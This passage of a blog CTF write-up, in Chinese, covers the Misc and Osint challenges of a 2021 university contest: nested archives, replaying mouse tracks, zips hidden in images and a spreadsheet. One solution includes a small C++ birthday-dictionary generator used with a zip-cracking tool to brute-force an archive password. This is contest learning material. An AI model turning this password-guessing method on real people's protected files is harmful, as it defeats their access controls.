+<h3 id="2-眼见为虚"><a href="#2-眼见为虚" class="headerlink" title="2.眼见为虚"></a>2.眼见为虚</h3><p>下载附件得到一个压缩包,解压,又得到一个压缩包,再解压,得到一个flag.txt,打开即可得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025203118107.png"
+                      alt="image-20211025203118107"
+                ></p>
+<h3 id="3-签退"><a href="#3-签退" class="headerlink" title="3.签退"></a>3.签退</h3><p>打开题目所给网址填完问卷即可得到flag</p>
+<h3 id="4-谁会拒绝嘉然呢？"><a href="#4-谁会拒绝嘉然呢？" class="headerlink" title="4.谁会拒绝嘉然呢？"></a>4.谁会拒绝嘉然呢？</h3><p>下载文件名为zip的附件,根据文件名猜测是个zip压缩包,解压得到”谁会拒绝嘉然呢”文件夹:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025203540591.png"
+                      alt="image-20211025203540591"
+                ><br> 运行exe文件发现是个拼图游戏,根据题目以及里面图片的提示决定直接拼,将图片一张一张往word里拖慢慢拼,最后可以得到flag(当时没有保存实在是不想再拼一遍了)</p>
+<h3 id="5-你画我猜"><a href="#5-你画我猜" class="headerlink" title="5.你画我猜"></a>5.你画我猜</h3><p>下载文件解压,得到一个mrf结尾的文件,经过反复搜索确认(搜了好久),确定是个记录鼠标轨迹的文件,可以用相应的软件(下了好多软件,最终确认是MouseRecorder)打开复现鼠标轨迹:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025204022521.png"
+                      alt="image-20211025204022521"
+                ><br> 准备打开画图复现轨迹,但是软件总是报错,最后将Window change这一项删掉后就可以正常复现了<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025225922662.png"
+                      alt="image-20211025225922662"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025204600748.png"
+                      alt="image-20211025204600748"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025204451999.png"
+                      alt="image-20211025204451999"
+                ></p>
+<h3 id="6-你究竟会不会看图片啊？"><a href="#6-你究竟会不会看图片啊？" class="headerlink" title="6.你究竟会不会看图片啊？"></a>6.你究竟会不会看图片啊？</h3><p>下载题目附件解压得到一个有密码的压缩包和一个二维码:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025205053058.png"
+                      alt="image-20211025205053058"
+                ><br> 扫描二维码得到一句”Do you know when Shanny’s birthday is”,得到关键信息-解压密码有可能是一个生日. 于是用c语言写了一个字典:</p>
+ <div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span> </span></span><br><span class="line"> <span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"> <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123; </span><br><span class="line">  <span class="built_in">freopen</span>(<span class="string">&quot;bar.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,stdout); </span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">01</span>;j&lt;=<span class="number">12</span>;j++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">1</span>;k&lt;=<span class="number">31</span>;k++)&#123; </span><br><span class="line">      <span class="keyword">if</span>(j/<span class="number">10</span>==<span class="number">0</span>) cout&lt;&lt;<span class="number">0</span>; cout&lt;&lt;j&lt;&lt;<span class="string">&quot;&quot;</span>; </span><br><span class="line">      <span class="keyword">if</span>(k/<span class="number">10</span>==<span class="number">0</span>) cout&lt;&lt;<span class="number">0</span>; cout&lt;&lt;k&lt;&lt;endl; </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025230317616.png"
+                      alt="image-20211025230317616"
+                ><br> 然后用github上的zipcrack跑密码,得到密码为0308:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025230549981.png"
+                      alt="image-20211025230549981"
+                ><br> 输入密码解压得到两张图片猜测是图片隐写 用01editor打开,在第一张图片里发现<code>XJUSEC&#123;Y0u_h2ve_a1r2ady_XJUSEC&#123;w0w j1ng rucb5439345d8b014396&#125;</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025205858897.png"
+                      alt="image-20211025205858897"
+                ><br> 第二张里发现flag:<code>a1r2ady_sta1ted&#125;</code>:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025205956732.png"
+                      alt="image-20211025205956732"
+                ><br> 拼接得到flag: <code>XJUSEC&#123;Y0u_h2ve_a1r2ady_sta1ted&#125;</code></p>
+<h3 id="7-暗藏玄机的excel"><a href="#7-暗藏玄机的excel" class="headerlink" title="7.暗藏玄机的excel"></a>7.暗藏玄机的excel</h3><p>下载附件flag.xlsx,打开查看里面内容,发现几条重要信息:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025211438283.png"
+                      alt="image-20211025211438283"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025211507228.png"
+                      alt="image-20211025211507228"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025211614649.png"
+                      alt="image-20211025211614649"
+                ><br> 根据最后一个提示,我用01editor打开这个文件发现文件头为<code>50 4B 03 04</code>判断是个zip压缩包:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025211756918.png"
+                      alt="image-20211025211756918"
+                ><br> 解压得:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025211958198.png"
+                      alt="image-20211025211958198"
+                ><br> 里面有很多文件,找了一会后发现几个信息:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025212701885.png"
+                      alt="image-20211025212701885"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025212346719.png"
+                      alt="image-20211025212346719"
+                ><br> 后来觉得开始excel里给的几个提示也许有用,一个是”表一少了什么,有什么东西看不见”,一个是”你不觉得表一中的嘉然很可爱吗”,觉得可能flag藏在这两个地方相关的文件里,于是notepad++打开几个相关的文件,发现了一些信息,如图:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025213252838.png"
+                      alt="image-20211025213252838"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025213302291.png"
+                      alt="image-20211025213302291"
+                ><br> 从这两个信息判断出这个图片一个隐藏了一个加密的zip的压缩包,把图片送进01editor搜索zip文件头<code>50 4B 03 04</code>文件头,发现:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025213500288.png"
+                      alt="image-20211025213500288"
+                ><br> 文件尾刚好也是<code>00 00 00 00</code>,确定是个zip压缩包,将<code>50 4B 03 04</code>及以下16进制代码另存为一个fffflag.zip:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025213719297.png"
+                      alt="image-20211025213719297"
+                ><br> 解压,密码在上面已获得,得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025213848528.png"
+                      alt="image-20211025213848528"
+                ></p>
+<hr>
+<h2 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h2><hr>
+<h3 id="1-找找flag"><a href="#1-找找flag" class="headerlink" title="1.找找flag?"></a>1.找找flag?</h3><p>根据题目提示访问Github搜索Ethe448,发现有一个hexo博客的项目,仔细看了看发现有个Secret(题目中的”小秘密”),打开得到两张图片:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025213925365.png"
+                      alt="image-20211025213925365"
+                ><br> 拼接二维码扫描得flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025214136400.png"
+                      alt="image-20211025214136400"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image.txg2333.top/2021/10/image-20211025214232394.png"
+                      alt="image-20211025214232394"
+                ></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> 2021XJU 1024CTF挑战赛Writeup</li>
+        <li><strong>作者:</strong> Thou</li>
+        <li><strong>创建于
+                :</strong> 2021-10-25 15:39:25</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2023-10-31 06:28:03
+            </li>
+        
+        <li>
+            <strong>链接:</strong> http://blog.txgde.space/2021/10/25/2021XJU 1024CTF挑战赛Writeup/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+            本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a> 进行许可。
+            
+
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/2021/">#2021</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Crypto/">#Crypto</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Misc/">#Misc</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Osint/">#Osint</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Pwn/">#Pwn</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Reverse/">#Reverse</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Web/">#Web</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/XJUSEC/">#XJUSEC</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/XJU%E6%96%B0%E7%94%9F%E8%B5%9B/">#XJU新生赛</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E6%AF%94%E8%B5%9B/">#比赛</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2021/10/25/2021xju-ctf%E6%96%B0%E7%94%9F%E8%B5%9Bwriteup/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">2021XJU CTF新生赛Writeup</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                        rel="next"
+                        href="/2021/10/05/%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93-ctfhub%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">[题型总结 &amp; CTFHub]上传文件</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;评论
+    </div>
+    
+
+        
+            
+    <div class="twikoo-container">
+        <script data-swup-reload-script
+                src='https://cdn.staticfile.org/twikoo/1.6.22/twikoo.all.min.js'
+        ></script>
+        <div id="twikoo-comment"></div>
+        <script data-swup-reload-script>
+            function loadTwikoo() {
+                twikoo.init({
+                    el: '#twikoo-comment',
+                    envId: 'https://test.txg2333.top:30443',
+                });
+            }
+
+            if ('true') {
+                const loadTwikooTimeout = setTimeout(() => {
+                    loadTwikoo();
+                    clearTimeout(loadTwikooTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadTwikoo);
+            }
+        </script>
+    </div>
+
+
+        
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">2021XJU 1024CTF挑战赛Writeup</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Pwn%E6%8C%87%E5%8C%97"><span class="nav-text">1.Pwn指北</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-test-your-nc"><span class="nav-text">2.test your nc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-RIP"><span class="nav-text">3.RIP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-level0"><span class="nav-text">4.level0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Guess-number"><span class="nav-text">5.Guess number</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-re%E7%AD%BE%E5%88%B0"><span class="nav-text">1.re签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-game-switch"><span class="nav-text">2.game switch</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%86%8D%E7%94%A8IDA%E7%AD%BE%E4%B8%80%E6%AC%A1%E5%88%B0"><span class="nav-text">3.再用IDA签一次到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Nizdy%E4%B8%8D%E5%96%9C%E6%AC%A2%E7%8E%A9%E6%B8%B8%E6%88%8F"><span class="nav-text">4.Nizdy不喜欢玩游戏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-easyre"><span class="nav-text">5.easyre</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-robots"><span class="nav-text">1.robots</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-where-is-f1ag"><span class="nav-text">2.where is f1ag?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-cookie"><span class="nav-text">3.cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-get-post"><span class="nav-text">4.get&amp;post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E7%BB%AF%E7%BA%A2%E4%B9%8B%E7%8E%8B"><span class="nav-text">5.绯红之王</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-text">6.伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-Do-you-know-http"><span class="nav-text">7.Do you know http?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Crypto%E6%8C%87%E5%8D%97"><span class="nav-text">1.Crypto指南</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%A4%BE%E4%BC%9A%E4%B8%BB%E4%B9%89%E6%A0%B8%E5%BF%83%E9%98%BF%E5%BC%A5%E9%99%80%E4%BD%9B"><span class="nav-text">2.社会主义核心阿弥陀佛</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%88%B1%E5%BC%B9%E8%B4%9D%E6%96%AF%E7%9A%84Caesar"><span class="nav-text">3.爱弹贝斯的Caesar</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%B0%8F%E7%BE%8A%E8%B7%B3%E6%A0%85%E6%A0%8F"><span class="nav-text">4.小羊跳栅栏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-d-%EF%BF%A3%E2%96%BD%EF%BF%A3-b"><span class="nav-text">5.d&#x3D;(￣▽￣*)b</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-ROT%E5%85%A8%E5%AE%B6%E6%A1%B6"><span class="nav-text">6.ROT全家桶</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E6%88%91emo%E4%BA%86"><span class="nav-text">7.我emo了</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-calendar"><span class="nav-text">8.calendar</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-%E7%BB%99%E6%88%91%E7%9A%84%E5%AE%9D%E5%89%91%E9%99%84%E4%B8%AA%E9%AD%94"><span class="nav-text">9.给我的宝剑附个魔</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%BD%A0%E6%98%AF%E4%B8%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%80%8C%E7%94%9F%E7%9A%84"><span class="nav-text">1.你是为网络安全而生的</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%9C%BC%E8%A7%81%E4%B8%BA%E8%99%9A"><span class="nav-text">2.眼见为虚</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%AD%BE%E9%80%80"><span class="nav-text">3.签退</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E8%B0%81%E4%BC%9A%E6%8B%92%E7%BB%9D%E5%98%89%E7%84%B6%E5%91%A2%EF%BC%9F"><span class="nav-text">4.谁会拒绝嘉然呢？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E4%BD%A0%E7%94%BB%E6%88%91%E7%8C%9C"><span class="nav-text">5.你画我猜</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E4%BD%A0%E7%A9%B6%E7%AB%9F%E4%BC%9A%E4%B8%8D%E4%BC%9A%E7%9C%8B%E5%9B%BE%E7%89%87%E5%95%8A%EF%BC%9F"><span class="nav-text">6.你究竟会不会看图片啊？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E6%9A%97%E8%97%8F%E7%8E%84%E6%9C%BA%E7%9A%84excel"><span class="nav-text">7.暗藏玄机的excel</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Osint"><span class="nav-text">Osint</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%89%BE%E6%89%BEflag"><span class="nav-text">1.找找flag?</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1"><a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank"><img id="upyun_logo" style="display:inline" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMTEiIGhlaWdodD0iMzgiIHZpZXdCb3g9IjAgMCAxMTEgMzgiPgogIDxnIGZpbGw9IiNGRkZGRkYiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC0xKSI+CiAgICA8cGF0aCBkPSJNMzAuOCw0LjEgTDMwLjgsNC4xIEwzMC44LDQuMSBMMzAuOCw0LjEgTDMwLjgsNC4xIEMzMC4xLDMuNiAyOS40LDMuMSAyOC42LDIuNyBDMjguMSwyLjQgMjcuNCwyLjUgMjcsMyBMMjIuMyw5LjIgTDIyLDkuNiBDMjEuNSwxMC4zIDIwLjcsMTAuNiAxOS45LDEwLjYgTDE5LDEwLjYgQzE2LjcsMTAuNyAxNC40LDExLjkgMTIuOSwxMy45IEMxMS43LDE1LjUgMTEuMSwxNy40IDExLjIsMTkuMyBDMTEuMiwxOS42IDExLjQsMTkuOSAxMS43LDIwLjEgQzEyLjMsMjAuNCAxMi44LDIxIDEzLDIxLjcgQzEzLjIsMjIuOCAxMi41LDIzLjggMTEuNSwyNC4xIEMxMC4zLDI0LjUgOSwyMy43IDguNywyMi41IEM4LjUsMjEuOCA4LjcsMjEuMiA5LjEsMjAuNyBDOS4zLDIwLjQgOS40LDIwLjEgOS40LDE5LjcgQzkuMiwxNy4zIDkuOCwxNC44IDExLjQsMTIuNyBDMTMuNCwxMC4xIDE2LjQsOC43IDE5LjUsOC43IEMyMC4xLDguNyAyMC42LDguNCAyMSw3LjkgTDI1LjMsMi4yIEMyNS42LDEuOCAyNS40LDEuMSAyNC45LDEgQzE3LjcsLTEgOS43LDEuNCA0LjgsNy43IEMtMS40LDE1LjggMC4xLDI3LjUgOC4yLDMzLjggQzksMzQuNCA5LjcsMzQuOSAxMC42LDM1LjQgQzExLjEsMzUuNyAxMS44LDM1LjYgMTIuMiwzNS4xIEwxNi45LDI4LjkgTDE3LjIsMjguNSBDMTcuNywyNy44IDE4LjUsMjcuNSAxOS4zLDI3LjUgTDIwLjIsMjcuNSBDMjIuNSwyNy40IDI0LjgsMjYuMiAyNi4zLDI0LjIgQzI3LjUsMjIuNiAyOC4xLDIwLjcgMjgsMTguOCBDMjgsMTguNSAyNy44LDE4LjIgMjcuNSwxOCBDMjYuOSwxNy43IDI2LjQsMTcuMSAyNi4yLDE2LjQgQzI2LDE1LjMgMjYuNywxNC4zIDI3LjcsMTQgQzI4LjksMTMuNiAzMC4yLDE0LjQgMzAuNSwxNS42IEMzMC43LDE2LjMgMzAuNSwxNi45IDMwLjEsMTcuNCBDMjkuOSwxNy43IDI5LjgsMTggMjkuOCwxOC40IEMzMCwyMC44IDI5LjQsMjMuMyAyNy44LDI1LjQgQzI1LjgsMjggMjIuOCwyOS40IDE5LjcsMjkuNCBDMTkuMSwyOS40IDE4LjYsMjkuNyAxOC4yLDMwLjIgTDE0LDM1LjYgQzEzLjcsMzYgMTMuOSwzNi43IDE0LjQsMzYuOCBDMjEuNiwzOC45IDI5LjcsMzYuNSAzNC41LDMwLjEgQzQwLjcsMjIgMzksMTAuMyAzMC44LDQuMSBaIi8+CiAgICA8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSg0MyA4KSI+CiAgICAgIDxwYXRoIGQ9Ik0xOC42LDIgTDE4LjYsMS42IEMxOC42LDEuMiAxOC4zLDEgMTgsMSBMMy41LDEgQzMuMiwxIDIuOSwxLjMgMi45LDEuNiBMMi45LDIuNSBDMi45LDIuOCAzLjIsMy4xIDMuNSwzLjEgTDE1LjgsMy4xIEMxNi4yLDMuMSAxNi40LDMuNCAxNi40LDMuOCBDMTYuMSw2LjEgMTUsMTAuNCAxMS42LDE0LjUgQzExLjQsMTQuOCAxMC45LDE0LjggMTAuNywxNC41IEM3LjksMTAuOSA3LDcuMiA2LjgsNS44IEM2LjcsNS41IDYuNSw1LjMgNi4yLDUuMyBMNS43LDUuMyBMNS4zLDUuMyBDNSw1LjMgNC43LDUuNiA0LjgsNiBDNS4xLDcuNiA2LjEsMTEuOSA5LjUsMTYgQzkuNywxNi4yIDkuNywxNi42IDkuNSwxNi44IEM1LjUsMjAuNSAxLjgsMjEuMyAwLjUsMjEuNSBDMC4yLDIxLjUgNy4xMDU0MjczNmUtMTUsMjEuOCA3LjEwNTQyNzM2ZS0xNSwyMi4xIEw3LjEwNTQyNzM2ZS0xNSwyMyBDNy4xMDU0MjczNmUtMTUsMjMuMyAwLjMsMjMuNiAwLjYsMjMuNiBDMi4xLDIzLjQgNi4zLDIyLjUgMTAuOCwxOC4zIEMxMSwxOC4xIDExLjQsMTguMSAxMS42LDE4LjMgQzEzLjgsMjAuMyAxNi42LDIyLjMgMjAuNCwyMy41IEMyMC43LDIzLjYgMjEsMjMuNCAyMS4xLDIzLjEgTDIxLjQsMjIuMyBDMjEuNSwyMiAyMS4zLDIxLjcgMjEsMjEuNiBDMTcuNSwyMC41IDE1LDE4LjcgMTMsMTYuOSBDMTIuOCwxNi43IDEyLjgsMTYuMyAxMywxNi4xIEMxOC41LDkuNCAxOC42LDIuMyAxOC42LDIgWiIvPgogICAgICA8cGF0aCBkPSJNMjguNiwwLjEgTDI3LjcsMC4xIEMyNy40LDAuMSAyNy4xLDAuNCAyNy4xLDAuNyBMMjcuMSwzLjggQzI3LjEsNC4xIDI2LjgsNC40IDI2LjUsNC40IEwyNC40LDQuNCBDMjQuMSw0LjQgMjMuOCw0LjcgMjMuOCw1IEwyMy44LDUuOSBDMjMuOCw2LjIgMjQuMSw2LjUgMjQuNCw2LjUgTDI2LjUsNi41IEMyNi44LDYuNSAyNy4xLDYuOCAyNy4xLDcuMSBMMjcuMSwxMS42IEMyNy4xLDExLjkgMjYuOCwxMi4yIDI2LjUsMTIuMiBMMjQuNCwxMi4yIEMyNC4xLDEyLjIgMjMuOCwxMi41IDIzLjgsMTIuOCBMMjMuOCwxMy43IEMyMy44LDE0IDI0LjEsMTQuMyAyNC40LDE0LjMgTDI2LjUsMTQuMyBDMjYuOCwxNC4zIDI3LjEsMTQuNiAyNy4xLDE0LjkgTDI3LjEsMTkuMiBDMjcuMSwyMC4xIDI2LjcsMjEuNiAyNC40LDIxLjggQzI0LjEsMjEuOCAyMy45LDIyLjEgMjMuOSwyMi40IEwyMy45LDIzIEMyMy45LDIzLjMgMjQuMiwyMy42IDI0LjUsMjMuNiBDMjYuOCwyMy40IDI5LjIsMjIuMSAyOS4yLDE4LjkgTDI5LjIsMTQuNiBDMjkuMiwxNC4zIDI5LjUsMTQgMjkuOCwxNCBMMzEuNywxNCBDMzIsMTQgMzIuMywxMy43IDMyLjMsMTMuNCBMMzIuMywxMi41IEMzMi4zLDEyLjIgMzIsMTEuOSAzMS43LDExLjkgTDI5LjgsMTEuOSBDMjkuNSwxMS45IDI5LjIsMTEuNiAyOS4yLDExLjMgTDI5LjIsNi44IEMyOS4yLDYuNSAyOS41LDYuMiAyOS44LDYuMiBMMzEuNyw2LjIgQzMyLDYuMiAzMi4zLDUuOSAzMi4zLDUuNiBMMzIuMyw0LjcgQzMyLjMsNC40IDMyLDQuMSAzMS43LDQuMSBMMjkuOCw0LjEgQzI5LjUsNC4xIDI5LjIsMy44IDI5LjIsMy41IEwyOS4yLDAuNiBDMjkuMiwwLjMgMjksMC4xIDI4LjYsMC4xIFoiLz4KICAgICAgPHBhdGggZD0iTTMzLjIsMjIuOCBDMzMuMiwyMy4xIDMzLjUsMjMuNCAzMy44LDIzLjQgTDQwLjMsMjMuNCBDNDMuMiwyMy40IDQ1LjUsMjEuMiA0NS41LDE4LjQgTDQ1LjUsNC43IEM0NS41LDQuNCA0NS4yLDQuMSA0NC45LDQuMSBMMzMuOCw0LjEgQzMzLjUsNC4xIDMzLjIsNC40IDMzLjIsNC43IEwzMy4yLDIyLjggWiBNNDAuNCwyMS40IEwzNS45LDIxLjQgQzM1LjYsMjEuNCAzNS4zLDIxLjEgMzUuMywyMC44IEwzNS4zLDE0LjYgQzM1LjMsMTQuMyAzNS42LDE0IDM1LjksMTQgTDQzLDE0IEM0My4zLDE0IDQzLjYsMTQuMyA0My42LDE0LjYgTDQzLjYsMTguNCBDNDMuNiwyMC4xIDQyLjEsMjEuNCA0MC40LDIxLjQgWiBNNDMuNiw2LjcgTDQzLjYsMTEuNCBDNDMuNiwxMS43IDQzLjMsMTIgNDMsMTIgTDM1LjksMTIgQzM1LjYsMTIgMzUuMywxMS43IDM1LjMsMTEuNCBMMzUuMyw2LjcgQzM1LjMsNi40IDM1LjYsNi4xIDM1LjksNi4xIEw0Myw2LjEgQzQzLjMsNi4yIDQzLjYsNi40IDQzLjYsNi43IFoiLz4KICAgICAgPHBhdGggZD0iTTQyLjEsMCBMMzYuMywwIEMzNiwwIDM1LjcsMC4zIDM1LjcsMC42IEwzNS43LDEuNSBDMzUuNywxLjggMzYsMi4xIDM2LjMsMi4xIEw0Mi4xLDIuMSBDNDIuNCwyLjEgNDIuNywxLjggNDIuNywxLjUgTD